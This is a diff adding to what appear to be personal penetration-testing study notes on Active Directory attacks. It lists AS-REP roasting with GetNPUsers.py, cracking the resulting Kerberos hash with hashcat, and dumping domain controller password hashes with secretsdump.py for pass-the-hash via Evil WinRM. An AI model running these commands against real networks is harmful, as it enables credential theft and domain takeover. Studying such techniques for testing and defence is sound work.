@@ -24,3 +24,9 @@ Example Commands:
 - python3 GetNPUsers.py <domain>/<username> -dc-ip <IP address> -> If the user does not need to provide valid ID, then we will be returned a Kerberos Hash of that user's password
 - We can then crack w/ Hashcat using the appropriate mode  https://hashcat.net/wiki/doku.php?id=example_hashes i.e. 
 sudo hashcat -a 0 -m 18200 hashfile.txt ~/Downloads/passwordlist.txt
+
+
+#----Priv. Escal. 
+10 secretsdump.py - Allows for the retrieval of all password hashes that this user account has access to. If the account we specify has access to hashes in AD, we can pull these out. So for example if we know the password of a backup acct or smth that has fairly high priv. or access to hashes, we can pivot from there to the hash for admin 
+- python3 secretsdump.py <username>@<IP of DC> -> Grabs the hashes associated on the DC. Can then use smth like Evil WinRM to pass the hash or crack
+
